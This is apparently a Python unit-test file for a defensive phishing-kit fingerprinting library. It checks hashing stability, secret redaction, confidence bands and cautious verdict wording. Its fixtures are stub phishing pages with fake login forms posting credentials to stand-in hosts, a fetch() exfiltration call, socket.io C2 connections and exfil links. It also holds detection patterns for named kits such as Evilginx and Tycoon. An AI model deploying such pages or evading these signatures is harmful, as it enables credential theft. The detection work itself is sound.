#!/usr/bin/env python3
"""Unit tests for scam-kit fingerprinting (relayshield_scamkit).

The repo's first PAYG endpoint tests: everything here is pure
(normalization / hashing / confidence), so no network, no AWS, no boto3.

Run:  python3 test_scamkit_fingerprinting.py
"""

import sys
import hashlib
import unittest

sys.path.insert(0, "/tmp/rs")  # local dev; CI runs from the repo root
import relayshield_scamkit as sk


KIT_A = """<html><head><title>PayPal Login</title></head><body>
<form action="https://evil.example.com/collect" method="post">
<input type="text" name="user"><input type="password" name="pass">
<script>var apiKey = "sk-live-abc123XYZ789qrs"; fetch("https://evil.example.com/x?sid=AAA111");</script>
</form></body></html>"""

# Same kit as KIT_A, but a different victim: rotated session nonce and a
# rotated API credential. Must fingerprint IDENTICALLY.
KIT_A_ROTATED = (
    KIT_A.replace("AAA111", "ZZZ999").replace("sk-live-abc123XYZ789qrs", "sk-live-rotated000AAA111")
)

# Genuinely different kit: different exfil host, different structure.
KIT_B = """<html><head><title>Secure Bank</title></head><body>
<div class="login"><form action="https://other-bad.example.org/in" method="post">
<input type="email" name="email"></form></div>
<script>console.log("hello");</script>
</body></html>"""


class TestHashStability(unittest.TestCase):
    def test_same_kit_different_nonces_same_id(self):
        s_a = sk.extract_signals(KIT_A, "https://x.example.net/?sid=AAA")
        s_b = sk.extract_signals(KIT_A_ROTATED, "https://x.example.net/?sid=ZZZ")
        self.assertEqual(sk.fingerprint_id(s_a), sk.fingerprint_id(s_b))

    def test_different_kits_different_ids(self):
        s_a = sk.extract_signals(KIT_A)
        s_b = sk.extract_signals(KIT_B)
        self.assertNotEqual(sk.fingerprint_id(s_a), sk.fingerprint_id(s_b))

    def test_id_shape(self):
        fid = sk.fingerprint_id(sk.extract_signals(KIT_A))
        self.assertTrue(fid.startswith("kit_"))
        self.assertTrue(sk.valid_fingerprint_id(fid))
        self.assertFalse(sk.valid_fingerprint_id("kit_zzz"))
        self.assertFalse(sk.valid_fingerprint_id(""))

    def test_normalize_is_deterministic(self):
        self.assertEqual(sk.normalize_html(KIT_A), sk.normalize_html(KIT_A))


class TestSecretStripping(unittest.TestCase):
    def test_credential_rotation_does_not_change_id(self):
        # The whole point: rotated secrets must not perturb the fingerprint.
        s_a = sk.extract_signals(KIT_A)
        s_b = sk.extract_signals(KIT_A_ROTATED)
        self.assertEqual(s_a, s_b)

    def test_secrets_never_appear_in_signals(self):
        blob = (
            'aws_key=AKIAIOSFODNN7EXAMPLE secret="hunter2-hunter2" '
            "bearer Bearer abcdefghijklmnop1234 "
            "uuid 123e4567-e89b-12d3-a456-426614174000 "
            "mac 00:1A:2B:3C:4D:5E victim@target.com"
        )
        signals = sk.extract_signals(f"<html><body><script>var x='{blob}';</script></body></html>")
        dumped = str(signals)
        for secret in ("AKIAIOSFODNN7EXAMPLE", "hunter2", "123e4567-e89b",
                       "00:1A:2B:3C:4D:5E", "victim@target.com", "abcdefghijklmnop1234"):
            self.assertNotIn(secret, dumped, f"secret leaked into signals: {secret}")

    def test_strip_secrets_idempotent(self):
        once = sk.strip_secrets(KIT_A)
        self.assertEqual(once, sk.strip_secrets(once))


class TestConfidenceBands(unittest.TestCase):
    def test_exact_band(self):
        conf, verdict = sk.compute_confidence(exact_sightings=2)
        self.assertGreaterEqual(conf, 0.90)
        self.assertEqual(verdict, "known_kit")
        self.assertEqual(sk.confidence_band(0.90), "exact")
        self.assertEqual(sk.confidence_band(1.00), "exact")

    def test_likely_variant_band(self):
        conf, verdict = sk.compute_confidence(overlap_fraction=0.60)
        self.assertGreaterEqual(conf, 0.60)
        self.assertLess(conf, 0.90)
        self.assertEqual(verdict, "likely_variant")
        self.assertEqual(sk.confidence_band(0.60), "likely_variant")
        self.assertEqual(sk.confidence_band(0.89), "likely_variant")

    def test_weak_band(self):
        conf, verdict = sk.compute_confidence(overlap_fraction=0.30)
        self.assertGreaterEqual(conf, 0.30)
        self.assertLess(conf, 0.60)
        self.assertEqual(sk.confidence_band(0.30), "weak")
        self.assertEqual(sk.confidence_band(0.59), "weak")

    def test_unknown_band(self):
        conf, verdict = sk.compute_confidence()
        self.assertLess(conf, 0.30)
        self.assertEqual(verdict, "unknown")
        self.assertEqual(sk.confidence_band(0.29), "unknown")
        self.assertEqual(sk.confidence_band(0.0), "unknown")


class TestVerdictCopy(unittest.TestCase):
    BANNED = ("safe", "clean", "legitimate", "trustworthy", "benign")

    def test_unknown_never_says_safe(self):
        import re
        copy = sk.verdict_copy("unknown")
        lowered = copy.lower()
        for word in self.BANNED:
            # Whole-word match: "safety" in the mandated caveat is fine,
            # a bare "safe" verdict is not.
            self.assertIsNone(re.search(rf"\b{word}\b", lowered),
                              f"banned word '{word}' in unknown copy")
        self.assertIn("not a guarantee of safety", copy)

    def test_all_verdicts_avoid_banned_words(self):
        copies = [
            sk.verdict_copy("unknown"),
            sk.verdict_copy("likely_variant", family="parcel-smish-eu-04", shared=5, total=9),
            sk.verdict_copy("likely_variant"),
            sk.verdict_copy("known_kit", family="parcel-smish-eu-04", sightings=7),
        ]
        for copy in copies:
            for word in self.BANNED:
                # "safety" contains "safe" as a substring — check whole words.
                import re
                self.assertIsNone(
                    re.search(rf"\b{word}\b", copy.lower()),
                    f"banned word '{word}' in verdict copy: {copy}",
                )

    def test_known_kit_copy_names_family(self):
        copy = sk.verdict_copy("known_kit", family="parcel-smish-eu-04", sightings=7)
        self.assertIn("parcel-smish-eu-04", copy)
        self.assertIn("7 sightings", copy)


class TestFamilySuggest(unittest.TestCase):
    def test_suggest_returns_suggested_never_approved(self):
        s_a = sk.extract_signals(KIT_A)
        s_b = sk.extract_signals(KIT_A_ROTATED)
        fams = [{"family": "parcel-smish-eu-04", "signals": s_a}]
        family, status = sk.suggest_family(s_b, fams)
        self.assertEqual(family, "parcel-smish-eu-04")
        self.assertEqual(status, "suggested")
        self.assertNotEqual(status, "approved")

    def test_no_match_returns_none(self):
        s_b = sk.extract_signals(KIT_B)
        fams = [{"family": "parcel-smish-eu-04", "signals": sk.extract_signals(KIT_A)}]
        self.assertEqual(sk.suggest_family(s_b, fams), (None, None))


# ---------------------------------------------------------------------------
# FLAME v1a indicator tests (skfp-v2)
# ---------------------------------------------------------------------------

FLOWERSTORM_APPID = "72782ba9-4490-4f03-8d82-562370ea3566"
CANARY_HEX = "a" * 64

KIT_FLAME = """<html><head><title>Gourmet Delights</title>
<link rel="icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==">
<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
</head><body>
<form action="https://evil.example.com/next.php" method="post">
<input type="text" name="user"><input type="password" name="pass">
</form>
<script>
var socket = io("https://c2.example.net");
socket.emit("new-session", {u: "x"});
socket.on("password_command", function(d){});
var appId = "%s";
var agent1 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; WebView/3.0)";
var agent2 = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)";
</script>
<a href="https://exfil.example.org/drop">x</a>
<a href="mailto:drop@exfil.example.org">m</a>
<span></span><b></b><i></i><em></em><u></u><font></font><div></div><p></p>
</body></html>""" % FLOWERSTORM_APPID

KIT_GREATNESS = """<html><body><script src="/admin/js/mj.php?id=1"></script></body></html>"""

KIT_TURNSTILE = """<html><head>
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async></script>
</head><body>
<div class="cf-turnstile" data-sitekey="0x4AAAAAAAx"></div>
<form action="/auth" method="post"><input type="password" name="pw"></form>
</body></html>"""

KIT_LOGIN_NO_TS = """<html><body>
<form action="https://evil.example.com/in" method="post">
<input type="text" name="u"><input type="password" name="p"></form>
</body></html>"""

KIT_TYCOON_TEXT = """<html><body>
<p>this page is running browser checks to ensure your security</p>
<div class="cf-turnstile"></div></body></html>"""

KIT_REACT = """<html><head><title>Login</title></head><body>
<div id="root"></div>
<script src="https://unpkg.com/react-dom@18.2.0/umd/react-dom.production.min.js"></script>
<script>ReactDOM.createRoot(document.getElementById('root')).render(App);</script>
</body></html>"""


class TestFlameV1aMarkers(unittest.TestCase):
    def test_kit_uri_markers(self):
        s = sk.extract_signals(KIT_GREATNESS)
        self.assertIn("greatness-admin-uri", s["kit_uri_markers"])
        self.assertIn("rockstar-flowerstorm-next-php",
                      sk.extract_signals(KIT_FLAME)["kit_uri_markers"])

    def test_evilginx_canary_matches_raw_before_redaction(self):
        canary = CANARY_HEX
        html = '<html><body><script src="/s/%s.js"></script></body></html>' % canary
        s = sk.extract_signals(html)
        self.assertIn("evilginx-canary-js", s["kit_uri_markers"])
        # the raw canary is what redaction would erase
        self.assertNotIn(canary, sk.strip_secrets(html))

    def test_markers_extracted_before_redaction(self):
        s = sk.extract_signals(KIT_FLAME)
        self.assertIn("rockstar-flowerstorm-appid", s["kit_appid_marks"])
        # strip_secrets would erase the GUID — extraction must precede it
        self.assertNotIn(FLOWERSTORM_APPID, sk.strip_secrets(KIT_FLAME))

    def test_hardcoded_ua_marks(self):
        s = sk.extract_signals(KIT_FLAME)
        self.assertIn("rockstar-flowerstorm-webview-ua", s["hardcoded_ua_marks"])
        self.assertIn("multiple-hardcoded-uas", s["hardcoded_ua_marks"])

    def test_socketio_kit_events_need_context(self):
        s = sk.extract_signals(KIT_FLAME)
        self.assertIn("new-session", s["socketio_kit_events"])
        self.assertIn("password_command", s["socketio_kit_events"])
        # generic event words alone, without socket.io context, don't fire
        s2 = sk.extract_signals('<html><body><p>new-session password_command</p></body></html>')
        self.assertEqual(s2["socketio_kit_events"], [])

    def test_turnstile_browser_checks(self):
        t = sk.extract_signals(KIT_TURNSTILE)["turnstile_browser_checks"]
        self.assertTrue(t["present"])
        self.assertIn("turnstile-script", t["artifacts"])
        self.assertIn("cf-turnstile-div", t["artifacts"])
        self.assertFalse(t["tycoon_browser_checks_text"])
        t2 = sk.extract_signals(KIT_TYCOON_TEXT)["turnstile_browser_checks"]
        self.assertTrue(t2["present"])
        self.assertTrue(t2["tycoon_browser_checks_text"])

    def test_no_turnstile_with_login(self):
        self.assertTrue(sk.extract_signals(KIT_LOGIN_NO_TS)["no_turnstile_with_login"])
        self.assertFalse(sk.extract_signals(KIT_TURNSTILE)["no_turnstile_with_login"])

    def test_favicon_data_hash(self):
        payload = ("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==")
        s = sk.extract_signals(KIT_FLAME)
        fd = s["favicon_data_hash"]
        self.assertEqual(fd["sha256"], hashlib.sha256(payload.encode()).hexdigest())
        # FLAME's Sneaky 2FA base64 favicon hash is truncated — never seeded
        self.assertFalse(fd["known_bad"])
        s2 = sk.extract_signals("<html><body>no favicon</body></html>")
        self.assertIsNone(s2["favicon_data_hash"]["sha256"])
        self.assertFalse(s2["favicon_data_hash"]["known_bad"])

    def test_empty_tag_stuffing(self):
        e = sk.extract_signals(KIT_FLAME)["empty_tag_stuffing"]
        self.assertTrue(e["present"])
        self.assertEqual(e["empty_tag_count"], 8)
        e2 = sk.extract_signals("<html><body><span></span></body></html>")["empty_tag_stuffing"]
        self.assertFalse(e2["present"])

    def test_title_marks(self):
        s = sk.extract_signals(KIT_FLAME)
        self.assertIn("sneaky2fa-gourmet-delights", s["title_marks"])
        s2 = sk.extract_signals(KIT_LOGIN_NO_TS)
        self.assertEqual(s2["title_marks"], [])

    def test_react_csr(self):
        r = sk.extract_signals(KIT_REACT)["react_csr"]
        self.assertTrue(r["present"])
        self.assertIn("react-dom-script", r["artifacts"])
        self.assertIn("reactdom-render", r["artifacts"])
        r2 = sk.extract_signals(KIT_LOGIN_NO_TS)["react_csr"]
        self.assertFalse(r2["present"])

    def test_anchor_and_email_hosts(self):
        s = sk.extract_signals(KIT_FLAME, "https://page.example.com/")
        self.assertEqual(s["anchor_exfil_hosts"], ["exfil.example.org"])
        self.assertEqual(s["email_hosts"], ["exfil.example.org"])
        # own host never listed
        s2 = sk.extract_signals(
            '<html><body><a href="https://page.example.com/x">y</a></body></html>',
            "https://page.example.com/")
        self.assertEqual(s2["anchor_exfil_hosts"], [])


class TestKitUrlPatternV2(unittest.TestCase):
    def test_v1_classes_still_work(self):
        self.assertEqual(sk.classify_url_pattern("http://185.22.44.10/x"), "ip-host")
        self.assertEqual(sk.classify_url_pattern("https://bit.ly/abc123"), "url-shortener")

    def test_evilginx_lure_path(self):
        self.assertEqual(
            sk.classify_url_pattern("https://evil.example.com/aBcDeFgH"), "evilginx-lure-path")
        # eight letters only — digits don't count
        self.assertNotEqual(
            sk.classify_url_pattern("https://evil.example.com/AbC12345"), "evilginx-lure-path")

    def test_evilginx_canary(self):
        self.assertEqual(
            sk.classify_url_pattern("https://evil.example.com/s/%s.js" % CANARY_HEX),
            "evilginx-canary")

    def test_mamba_relay_url(self):
        self.assertEqual(
            sk.classify_url_pattern("https://evil.example.com/m/?aGVsbG8gd29ybGQ="),
            "mamba-relay-url")
        # nonce rotation must not change the class
        self.assertEqual(
            sk.classify_url_pattern("https://evil.example.com/o/?eHl6ejEyMzQ%3D"),
            "mamba-relay-url")

    def test_greatness_admin_uri(self):
        self.assertEqual(
            sk.classify_url_pattern("https://evil.example.com/admin/js/mj.php"),
            "greatness-admin-uri")

    def test_nakedpages_buzz_domain(self):
        self.assertEqual(
            sk.classify_url_pattern("https://supercalifragilisticexpialidocious.buzz/login"),
            "nakedpages-buzz-domain")
        # short .buzz domains don't fire
        self.assertNotEqual(
            sk.classify_url_pattern("https://example.buzz/login"), "nakedpages-buzz-domain")

    def test_behavior_classes_need_observations(self):
        rickroll_obs = {"redirect_chain": ["https://evil.example.com/aBcDeFgH",
                                           "https://www.youtube.com/watch?v=dQw4w9WgXcQ"]}
        self.assertEqual(
            sk.classify_url_pattern("https://evil.example.com/aBcDeFgH", rickroll_obs),
            "evilginx-rickroll-redirect")
        wiki_obs = {"redirect_chain": ["https://evil.example.com/aBcDeFgH",
                                       "https://en.wikipedia.org/wiki/Main_Page"]}
        self.assertEqual(
            sk.classify_url_pattern("https://evil.example.com/aBcDeFgH", wiki_obs),
            "w3ll-wikipedia-antibot-redirect")
        # same URLs without observations stay static classes
        self.assertEqual(
            sk.classify_url_pattern("https://evil.example.com/aBcDeFgH"),
            "evilginx-lure-path")
        self.assertNotEqual(
            sk.classify_url_pattern("https://evil.example.com/aBcDeFgH"),
            "w3ll-wikipedia-antibot-redirect")

    def test_v1_fallback_class_preserved(self):
        s = sk.extract_signals(KIT_A, "https://totally-legit-paypal.example/")
        self.assertEqual(s["url_pattern_class_v1"], sk._classify_url_pattern_v1(
            "https://totally-legit-paypal.example/"))
        self.assertEqual(s["url_pattern_class"], "typosquat-brand")
        self.assertEqual(s["url_pattern_class_v1"], "typosquat-brand")


class TestFingerprintVersioning(unittest.TestCase):
    def test_current_version_is_v2(self):
        self.assertEqual(sk.FINGERPRINT_VERSION, "skfp-v2")

    def test_v2_id_differs_from_v1_projection(self):
        s = sk.extract_signals(KIT_A, "https://totally-legit-paypal.example/")
        v2_id = sk.fingerprint_id(s)
        v1_id = sk.fingerprint_id(sk.v1_signal_projection(s))
        self.assertTrue(sk.valid_fingerprint_id(v2_id))
        self.assertTrue(sk.valid_fingerprint_id(v1_id))
        self.assertNotEqual(v2_id, v1_id)

    def test_v1_projection_schema_exact(self):
        s = sk.extract_signals(KIT_A, "https://totally-legit-paypal.example/")
        proj = sk.v1_signal_projection(s)
        self.assertEqual(set(proj), set(sk.V1_SIGNAL_KEYS) | {"fingerprint_version"})
        self.assertEqual(proj["fingerprint_version"], sk.FINGERPRINT_VERSION_V1)
        # the v1 projection has the frozen v1 URL class, not a v2 one
        self.assertEqual(proj["url_pattern_class"], s["url_pattern_class_v1"])
        self.assertNotIn("kit_uri_markers", proj)

    def test_v1_projection_stable_across_nonce_rotation(self):
        s1 = sk.extract_signals(KIT_A, "https://totally-legit-paypal.example/")
        s2 = sk.extract_signals(KIT_A_ROTATED, "https://totally-legit-paypal.example/")
        self.assertEqual(sk.fingerprint_id(sk.v1_signal_projection(s1)),
                         sk.fingerprint_id(sk.v1_signal_projection(s2)))

    def test_unsupported_version_rejected(self):
        s = sk.extract_signals(KIT_A)
        with self.assertRaises(ValueError):
            sk.fingerprint_id(s, version="skfp-v99")

    def test_explicit_version_selects_namespace(self):
        s = sk.extract_signals(KIT_A, "https://totally-legit-paypal.example/")
        self.assertEqual(sk.fingerprint_id(s, version=sk.FINGERPRINT_VERSION),
                         sk.fingerprint_id(s))


class TestCorpusCandidates(unittest.TestCase):
    def test_candidate_structure(self):
        s = sk.extract_signals(KIT_FLAME, "https://page.example.com/")
        c = sk.extract_corpus_candidates(KIT_FLAME, "https://page.example.com/", s)
        for key in ("app_ids", "email_hosts", "exfil_hosts", "kit_uri_markers",
                    "marker_family_hints", "socketio_hosts"):
            self.assertIn(key, c)
        self.assertIn(FLOWERSTORM_APPID, c["app_ids"])
        self.assertIn("exfil.example.org", c["exfil_hosts"])
        self.assertIn("exfil.example.org", c["email_hosts"])
        self.assertIn("rockstar-flowerstorm-next-php", c["kit_uri_markers"])
        self.assertIn("flowerstorm", c["marker_family_hints"])
        self.assertIn("mamba-2fa", c["marker_family_hints"])
        self.assertIn("sneaky-2fa", c["marker_family_hints"])
        # socket.io CDN host recorded as relay-infrastructure candidate
        self.assertIn("cdn.socket.io", c["socketio_hosts"])

    def test_tycoon_hint_marked_historical(self):
        s = sk.extract_signals(KIT_TYCOON_TEXT)
        c = sk.extract_corpus_candidates(KIT_TYCOON_TEXT, "", s)
        self.assertIn("tycoon-2fa", c["marker_family_hints"])
        self.assertIn("tycoon-2fa", sk.HISTORICAL_FAMILIES)

    def test_unknown_guid_only_in_auth_context(self):
        unknown = "aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee"
        in_ctx = '<html><body><a href="https://login.example.com/auth?client_id=%s">x</a></body></html>' % unknown
        c = sk.extract_corpus_candidates(in_ctx)
        self.assertIn(unknown, c["app_ids"])
        # same GUID bare in prose is not an App ID candidate
        bare = '<html><body><p>ref %s</p></body></html>' % unknown
        c2 = sk.extract_corpus_candidates(bare)
        self.assertNotIn(unknown, c2["app_ids"])

    def test_no_victim_secrets_in_candidates(self):
        html = ('<html><body><form action="https://evil.example.com/next.php">'
                '<input type="password" name="pw" value="hunter2hunter2secret"></form></body></html>')
        s = sk.extract_signals(html)
        c = sk.extract_corpus_candidates(html, "", s)
        self.assertNotIn("hunter2hunter2secret", str(c))
        self.assertNotIn("hunter2hunter2secret", str(s))

    def test_raw_values_not_in_hashed_signals(self):
        # raw infrastructure values live in candidates, marker NAMES in signals
        s = sk.extract_signals(KIT_FLAME)
        self.assertNotIn(FLOWERSTORM_APPID, str(s))
        self.assertIn("rockstar-flowerstorm-appid", s["kit_appid_marks"])


class TestMarkerSuggestFamily(unittest.TestCase):
    def test_markers_match_variant(self):
        s1 = sk.extract_signals(KIT_FLAME, "https://a.example/")
        variant = KIT_FLAME.replace("exfil.example.org", "other-exfil.example.net")
        s2 = sk.extract_signals(variant, "https://b.example/")
        fam, status = sk.suggest_family(s2, [{"family": "flowerstorm-test", "signals": s1}])
        self.assertEqual(fam, "flowerstorm-test")
        self.assertEqual(status, "suggested")

    def test_v1_rows_still_scorable(self):
        # old rows (v1 keys only) must remain comparable under the new scorer
        s2 = sk.extract_signals(KIT_A_ROTATED, "https://totally-legit-paypal.example/")
        old_v1 = sk.v1_signal_projection(
            sk.extract_signals(KIT_A, "https://totally-legit-paypal.example/"))
        score, comparable = sk._overlap_score(s2, old_v1)
        self.assertGreaterEqual(score, 4)
        self.assertGreater(comparable, 0)

    def test_never_auto_approves(self):
        s1 = sk.extract_signals(KIT_FLAME, "https://a.example/")
        fam, status = sk.suggest_family(s1, [{"family": "flowerstorm-test", "signals": s1}])
        self.assertNotEqual(status, "approved")


if __name__ == "__main__":
    unittest.main(verbosity=2)
